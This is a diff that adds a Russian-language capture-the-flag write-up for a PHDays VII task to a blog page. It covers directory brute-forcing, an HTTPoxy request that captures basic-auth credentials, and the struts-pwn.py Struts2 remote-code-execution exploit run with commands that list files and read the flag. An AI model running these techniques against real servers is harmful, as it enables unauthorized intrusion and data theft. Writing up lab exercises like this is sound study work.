@@ -318,3 +318,59 @@ flag=c0a495e8886c26afc0d541da2d19adf0
 ## PWND!
 
 ## flag:<font color="red">c0a495e8886c26afc0d541da2d19adf0</font>
+
+<br><br>CIA: Заходим на сайт, кроме лого больше ничего не видим, сканируем директории, находим там /orders/ на котором висит http basic auth. Естественно, пытаемся брутфорсить со стандартными логинами - терпим неудачу. Потыкав сайт замечаем версию веб-сервера 
+{% highlight ruby %}
+Apache/2.4.10 (Debian) Server at cia.rosnadzorcom.ru Port 80
+{% endhighlight %}
+Идем искать, что можно найти на эту версию веб-сервера, попробовав несколько из "больших" эксплоитов, угадываем с HTTProxy. Крафтим запрос вида 
+![screenshot  of running program](http://{{ site.url }}/downloads/phdaysvii/cia-burp.png)
+Заранее подняв лисенер на порту принимаем на сервис и видим
+![screenshot  of running program](http://{{ site.url }}/downloads/phdaysvii/cia-creds.png)
+У нас есть все что надо, идем на /orders/ , впринципе там делать особо нечего, можно еще раз дирбастнуть или же просто немного потыкав на сайт, видим вывод ошибки при  url вида /orders/orders/asd/bla
+![screenshot  of running program](http://{{ site.url }}/downloads/phdaysvii/cia-error.png)
+То есть на сервере еще и работает struts2 и opensymphony. Вспоминаем, или же гуглим на них эксплоиты, недавно выходил RCE эксплоит на struts2. Берем его изменяем исходники, чтобы он отправлял в запросе также и хидер Authentification:
+![screenshot  of running program](http://{{ site.url }}/downloads/phdaysvii/cia-exploit.png)
+И запускаем экслоит
+{% highlight ruby %}
+python struts-pwn.py -u https://cia.rosnadzorcom.ru/orders/orders/asd/asd -c ls
+
+[*] URL: https://cia.rosnadzorcom.ru/orders/orders/asd/asd
+[*] CMD: ls
+Afkr4iFDfg32d_SECRET.txt
+bin
+boot
+core
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+
+[%] Done.
+{% endhighlight %}
+Осталось прочитать файл Afkr4iFDfg32d_SECRET.txt
+{% highlight ruby %}
+python struts-pwn.py -u https://cia.rosnadzorcom.ru/orders/orders/asd/asd -c "cat Afkr4iFDfg32d_SECRET.txt"
+
+[*] URL: https://cia.rosnadzorcom.ru/orders/orders/asd/asd
+[*] CMD: cat Afkr4iFDfg32d_SECRET.txt
+FLAG_IS: md5('!!N3ith3r__c0nf1rm_N0r_d3n141--')
+[%] Done.
+{% endhighlight %}
+
+## PWND!
+
+## flag:<font color="red">md5('!!N3ith3r__c0nf1rm_N0r_d3n141--')</font>
